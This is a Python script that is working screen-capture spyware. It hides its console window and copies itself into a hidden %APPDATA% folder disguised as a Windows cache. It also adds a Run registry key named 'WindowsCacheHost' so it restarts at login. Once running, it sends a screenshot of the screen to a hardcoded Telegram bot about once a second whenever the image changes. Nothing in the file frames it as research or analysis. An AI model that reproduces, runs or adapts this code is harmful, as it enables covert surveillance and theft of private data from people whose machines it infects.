import time
import hashlib
import requests
from mss import mss
from PIL import Image
import io
import os
import sys
import shutil
import getpass
import subprocess
import ctypes
import platform

BOT_TOKEN = "8756129429:AAGB9oU3GawFGLj4FMox5D1Lra3C6MGfTRg"
CHAT_ID = "1299401914"

def hide_console():
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def install_persistence():
    if platform.system() != "Windows":
        return

    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Caches")
    os.makedirs(hidden_dir, exist_ok=True)
    
    launcher_path = os.path.join(hidden_dir, "cachehost.pyw")
    if not os.path.exists(launcher_path):
        with open(__file__, 'r', encoding='utf-8') as f:
            code = f.read()
        with open(launcher_path, 'w', encoding='utf-8') as f:
            f.write(code)
        ctypes.windll.kernel32.SetFileAttributesW(launcher_path, 2)
    
    subprocess.run(
        ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
         "/v", "WindowsCacheHost", "/t", "REG_SZ",
         "/d", f'pythonw.exe "{launcher_path}"', "/f"],
        capture_output=True
    )

    ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 2)

def capture_screen():
    with mss() as sct:
        monitor = sct.monitors[1]
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        return img

def get_image_hash(img):
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return hashlib.md5(buf.getvalue()).hexdigest()

def send_to_telegram(img):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": buf})

def main():
    hide_console()
    install_persistence()

    last_hash = None
    while True:
        try:
            img = capture_screen()
            current_hash = get_image_hash(img)
            if current_hash != last_hash:
                send_to_telegram(img)
                last_hash = current_hash
            time.sleep(1)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
